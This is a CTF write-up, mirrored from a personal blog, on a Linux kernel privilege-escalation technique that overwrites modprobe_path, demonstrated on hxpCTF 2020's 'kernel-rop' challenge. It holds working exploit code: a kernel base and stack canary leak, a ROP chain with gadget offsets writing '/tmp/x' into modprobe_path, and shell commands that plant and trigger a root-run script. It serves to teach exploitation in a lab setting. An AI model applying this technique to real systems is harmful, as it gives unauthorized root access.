---
# Documentation: https://wowchemy.com/docs/managing-content/

title: "Linux Kernel Exploitation Technique by overwriting modprobe_path"
subtitle: ""
summary: "A popular and powerful technique to exploit the linux kernel"
authors: [midas]
tags: []
categories: []
date: 2021-02-23T20:20:10+07:00
lastmod: 2021-02-23T20:20:10+07:00
featured: false
draft: false

# Featured image
# To use, add an image named `featured.jpg/png` to your page's folder.
# Focal points: Smart, Center, TopLeft, Top, TopRight, Left, Right, BottomLeft, Bottom, BottomRight.
image:
  caption: ""
  focal_point: ""
  preview_only: false

# Projects (optional).
#   Associate this post with one or more of your projects.
#   Simply enter your project's folder or file name without extension.
#   E.g. `projects = ["internal-project"]` references `content/project/deep-learning/index.md`.
#   Otherwise, set `projects = []`.
projects: []
---

**This post is mirrored from its [original post at my blog](https://lkmidas.github.io/posts/20210223-linux-kernel-pwn-modprobe/), some texts/links here maybe broken.**

{{< toc >}}

## Preface
If you have taken a look at [my series on learning linux kernel exploitation](https://lkmidas.github.io/posts/20210123-linux-kernel-pwn-part-1/), you probably have known that I have been learning the topic lately. For the previous several weeks, my team and I have participated in some CTFs, namely `DiceCTF` and `UnionCTF`, which both have a linux kernel pwn challenge. To my little knowledge and average brain power, I could not solve any of them, but through reading the writeups from other wonderful CTF teams and players, I have found out that a lot of them use a similar technique, in which the payload doesn't need to go through a painful process of making calls to `prepare_kernel_cred()` and `commit_creds()` at all. That technique is by overwriting the `modprobe_path` in the kernel. It is completely new to me, so I did some research on the Internet and experimented it out for myself. What I found is that this technique is quite popular and so easy to use, to a point that lots of pwners prefer to use it over all the traditional techniques.

However, during my research, I didn't come across many posts or articles which explain the technique clearly, that's why I decided to write this post to clarify it a little bit. The technique itself is not complicated at all, I might also say that it is much simpler than the one that I demonstrated in me previous series. To demonstrate it in this post, I will be (ab)using `hxpCTF 2020` challenge `kernel-rop` again, simply because its simplicity is perfect for demonstration purpose.

This post is gonna be on the shorter side, but I hope it can be useful for those who haven't known of this technique yet.

{{% callout %}}
*Use the table of contents on the right to navigate to the section that you are interested in.*
{{% /callout %}}

## Introducing the challenge
Because I want this post to be a separate standalone post from my prevous series, I will re-explain the challenge `kernel-rop`. If you have already read the series, or experienced the challenge yourself, feel free to skip this part.

In short, the challenge gives us the following files:
- [vmlinuz](vmlinuz) - the compressed Linux kernel.
- [initramfs.cpio.gz](initramfs.cpio.gz) - the Linux file system, the vulnearable kernel module call `hackme.ko` is included in here.
- [run.sh](run.sh) - the shell script that contains `qemu` run command.

And these are the information that we can get from those files:
- The system has full protection: `SMEP`, `SMAP`, `KPTI` and `KASLR`.
- The linux kernel uses [FG-KASLR](https://lwn.net/Articles/824307/), a non-mainstream version of `KASLR` which adds an extra layer of protection by randomizing each functions' addresses, instead of just the kernel base.
- The vulnearable module registers a device named `hackme` in `hackme_init()`, which we can open and perform read/write operations on it.
- The `hackme_read()` and `hackme_write()` functions have a stack buffer overflow vulnerability, which allows us to read and write almost infinitely on the kernel stack:

```C
ssize_t __fastcall hackme_write(file *f, const char *data, size_t size, loff_t *off)
{   
    //...
    int tmp[32];
    //...
    if ( _size > 0x1000 )
    {
        _warn_printk("Buffer overflow detected (%d < %lu)!\n", 4096LL, _size);
        BUG();
    }
    _check_object_size(hackme_buf, _size, 0LL);
    if ( copy_from_user(hackme_buf, data, v5) )
        return -14LL;
    _memcpy(tmp, hackme_buf);
    //...
}

ssize_t __fastcall hackme_read(file *f, char *data, size_t size, loff_t *off)
{   
    //...
    int tmp[32];
    //...
    _memcpy(hackme_buf, tmp);
    if ( _size > 0x1000 )
    {
        _warn_printk("Buffer overflow detected (%d < %lu)!\n", 4096LL, _size);
        BUG();
    }
    _check_object_size(hackme_buf, _size, 1LL);
    v6 = copy_to_user(data, hackme_buf, _size) == 0;
    //...
}
```

That's it for the challenge and its environment, super simple and standard. Now let's get into the most important part, which is explaining the technique itself.

{{% callout %}}
*In the [final part](https://lkmidas.github.io/posts/20210205-linux-kernel-pwn-part-3/) of my previous series, I have demonstrated an exploit that is used by the author, using a 4-stage payload to call `commit_creds(prepare_kernel_cred(0))`. If you are interested, you can check it out.* 
{{% /callout %}}

## The overwriting modprobe_path technique
First of all, what is `modprobe`? According to wikipedia: "*`modprobe` is a Linux program originally written by Rusty Russell and used to add a loadable kernel module to the Linux kernel or to remove a loadable kernel module from the kernel*". Effectively, this is a program that will be executed when we install or uninstall a new module into the linux kernel. The path to it is a kernel global variable, which is default to be `/sbin/modprobe`, we can check it ourselves by running the following command:
```bash
cat /proc/sys/kernel/modprobe
-> /sbin/modprobe
```

As of now, you might be wondering why and how this program is going to be useful for kernel exploitation. Let me tell you the two things that make it so exploitable:

Firstly, the path to `modprobe`, which is `/sbin/modprobe` by default, is stored under the symbol `modprobe_path` in the kernel itself, and also in a writable page. We can get its address by reading `/proc/kallsyms` (the address will be different for you since there is `KASLR`):
```bash
cat /proc/kallsyms | grep modprobe_path
-> ffffffffa7a61820 D modprobe_path
```

Secondly, the program, whose path is stored in `modprobe_path`, will be executed when we execute a file with an unknown file type. More precisely, if we call `execve()` on a file whose [file signature](https://en.wikipedia.org/wiki/List_of_file_signatures) (aka magic header) is unknown by the system, it will then make the following calls, which in the end invokes `modprobe`:
1. [do_execve()](https://elixir.bootlin.com/linux/latest/source/fs/exec.c#L1977)
2. [do_execveat_common()](https://elixir.bootlin.com/linux/latest/source/fs/exec.c#L1855)
3. [bprm_execve()](https://elixir.bootlin.com/linux/latest/source/fs/exec.c#L1788)
4. [exec_binprm()](https://elixir.bootlin.com/linux/latest/source/fs/exec.c#L1740)
5. [search_binary_handler()](https://elixir.bootlin.com/linux/latest/source/fs/exec.c#L1694)
6. [request_module()](https://elixir.bootlin.com/linux/latest/source/kernel/kmod.c#L124)
7. [call_modprobe()](https://elixir.bootlin.com/linux/latest/source/kernel/kmod.c#L69)

All of those calls will do this in the end:
```C
static int call_modprobe(char *module_name, int wait)
{
    ...
  	argv[0] = modprobe_path;
  	argv[1] = "-q";
  	argv[2] = "--";
  	argv[3] = module_name;
  	argv[4] = NULL;

  	info = call_usermodehelper_setup(modprobe_path, argv, envp, GFP_KERNEL,
					 NULL, free_modprobe_argv, NULL);
    ...
}
```

In short, whatever file whose path is currently stored in `modprobe_path` will be executed when we issue the system to execute a file with an unknown file type. Therefore, the plan of this technique is to use an arbitrary write primitive to overwrite `modprobe_path` into a path to a shell script that we have written ourselves, then we execute a dummy file with an unknown file signature. The result is that the shell script will be executed when the system is still in kernel mode, leading to an ***arbitrary code execution with root privileges***.

To see the technique in action, let's write a payload for `kernel-rop`.

## The payload
### Gathering gadgets and addresses
The prerequisites for the technique is as follow:
1. knowing the address of `modprobe_path`.
2. knowing the address of `kpti_trampoline` in order to cleanly return to userland after overwriting `modprobe_path`.
3. having an arbitrary write primitive.

In the case of a stack buffer overflow that we have in this challenge, those 3 prerequisites are actually in fact converge to just one, which is knowing the kernel image base, here's why:
- Interestingly, both `modprobe_path` and `kpti_trampoline` are unaffected by `FG-KASLR`, so their addresses are a constant offset from the kernel image base.
- For the arbitrary write, we can use these 3 gadgets, which reside in the area at the start of the kernel, which is unaffected by `FG-KASLR`:
```C
unsigned long pop_rax_ret = image_base + 0x4d11UL; // pop rax; ret;
unsigned long pop_rbx_r12_rbp_ret = image_base + 0x3190UL; // pop rbx ; pop r12 ; pop rbp ; ret;
unsigned long write_ptr_rbx_rax_pop2_ret = image_base + 0x306dUL; // mov qword ptr [rbx], rax; pop rbx; pop rbp; ret;
```

We leak the kernel image base and calculate those addresses by using the `hackme_read()` operation:
```C
void leak(void){
    unsigned n = 40;
    unsigned long leak[n];
    ssize_t r = read(global_fd, leak, sizeof(leak));
    cookie = leak[16];
    image_base = leak[38] - 0xa157ULL;
    kpti_trampoline = image_base + 0x200f10UL + 22UL;
    pop_rax_ret = image_base + 0x4d11UL;
    pop_rbx_r12_rbp_ret = image_base + 0x3190UL;
    write_ptr_rbx_rax_pop2_ret = image_base + 0x306dUL;
    modprobe_path = image_base + 0x1061820UL;

    printf("[*] Leaked %zd bytes\n", r);
    printf("    --> Cookie: %lx\n", cookie);
    printf("    --> Image base: %lx\n", image_base);
}
```

### Overwriting modprobe_path
After leaking, the goal now is to overwrite `modprobe_path` into a path to a file that we can control. In most linux system, we can freely read and write into the `/tmp` directory as any user, therefore, I will overwrite `modprobe_path` into a file called `/tmp/x` by using the 3 gadgets mentioned above, then safely return to the function `get_flag()` in userland after going through the `kpti_trampoline`:
```C
void overflow(void){
    unsigned n = 50;
    unsigned long payload[n];
    unsigned off = 16;
    payload[off++] = cookie;
    payload[off++] = 0x0; // rbx
    payload[off++] = 0x0; // r12
    payload[off++] = 0x0; // rbp
    payload[off++] = pop_rax_ret; // return address
    payload[off++] = 0x782f706d742f; // rax <- "/tmp/x"
    payload[off++] = pop_rbx_r12_rbp_ret;
    payload[off++] = modprobe_path; // rbx <- modprobe_path
    payload[off++] = 0x0; // dummy r12
    payload[off++] = 0x0; // dummy rbp
    payload[off++] = write_ptr_rbx_rax_pop2_ret; // modprobe_path <- "/tmp/x"
    payload[off++] = 0x0; // dummy rbx
    payload[off++] = 0x0; // dummy rbp
    payload[off++] = kpti_trampoline; // swapgs_restore_regs_and_return_to_usermode + 22
    payload[off++] = 0x0; // dummy rax
    payload[off++] = 0x0; // dummy rdi
    payload[off++] = (unsigned long)get_flag;
    payload[off++] = user_cs;
    payload[off++] = user_rflags;
    payload[off++] = user_sp;
    payload[off++] = user_ss;

    puts("[*] Prepared payload to overwrite modprobe_path");
    ssize_t w = write(global_fd, payload, sizeof(payload));

    puts("[!] Should never be reached");
}
```

### Executing arbitrary script
Now that `modprobe_path` is pointing to `/tmp/x`, what we would want to do is to write its content, which will be executed with root privileges. In this case, I will just write a simple shell script that copy the flag from `/dev/sda` into the `/tmp` directory and make it readable by all users. This is the script:
```bash
#!/bin/sh
cp /dev/sda /tmp/flag
chmod 777 /tmp/flag
```

After that, I write a dummy file which contains only `\xff` bytes, in order to make it an unknown file to the system, and then execute it. After it is finished executing, we should have the flag file in `/tmp` that can be read:
```C
void get_flag(void){
    puts("[*] Returned to userland, setting up for fake modprobe");
    
    system("echo '#!/bin/sh\ncp /dev/sda /tmp/flag\nchmod 777 /tmp/flag' > /tmp/x");
    system("chmod +x /tmp/x");

    system("echo -ne '\\xff\\xff\\xff\\xff' > /tmp/dummy");
    system("chmod +x /tmp/dummy");

    puts("[*] Run unknown file");
    system("/tmp/dummy");

    puts("[*] Hopefully flag is readable");
    system("cat /tmp/flag");

    exit(0);
}
```

If all goes well and correctly, the flag should be printed out.

## Conclusion
Up until this point, I think we can all understand why this technique is so loved by pwners. I am actually very amazed when I understood it and wrote an exploit using it by myself, because it is literally the best of both worlds in the sense that it is not only simple to understand and deliver, but also has minimal prerequisites. That's why I have to immediately write this post, I hope it is useful for the readers, and feel free to correct me if I'm wrong at any point or if there is any misinformation in the post.

## Appendix
The full exploit code is [modprobe.c](modprobe.c).
